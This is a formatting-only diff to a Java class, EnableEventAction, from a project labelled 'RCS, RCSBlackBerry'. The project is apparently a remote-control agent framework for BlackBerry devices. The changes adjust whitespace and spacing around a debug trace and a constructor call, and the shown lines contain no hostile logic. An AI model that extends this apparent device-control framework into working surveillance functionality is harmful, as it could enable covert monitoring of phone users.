@@ -6,7 +6,7 @@
  * 
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
-	
+
 package blackberry.action;
 
 import blackberry.Trigger;
@@ -19,14 +19,15 @@ public class EnableEventAction extends EventAction {
     //#ifdef DEBUG
     private static Debug debug = new Debug("StartEventAction",
             DebugLevel.VERBOSE);
+
     //#endif
     public EnableEventAction(ConfAction params) {
-        super( params);
+        super(params);
     }
 
     public boolean execute(Trigger trigger) {
         //#ifdef DEBUG
-        debug.trace("execute: "+eventId);
+        debug.trace("execute: " + eventId);
         //#endif
 
         final EventManager eventManager = EventManager.getInstance();
